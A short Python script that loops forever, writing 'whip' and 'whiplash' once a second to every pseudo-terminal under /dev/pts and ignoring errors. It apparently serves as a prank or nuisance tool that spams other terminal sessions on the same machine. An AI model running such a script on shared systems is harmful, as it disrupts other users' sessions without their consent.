#!/usr/bin/env python3
import time
import os

def get_ttys():
    return [
        os.path.join("/dev/pts", p)
        for p in os.listdir("/dev/pts")
        if p.isdigit()
    ]

while True:
    for tty in get_ttys():
        try:
            with open(tty, "w") as f:
                f.write("whip\n")
        except:
            pass

    time.sleep(1)

    for tty in get_ttys():
        try:
            with open(tty, "w") as f:
                f.write("whiplash\n")
        except:
            pass

    time.sleep(1)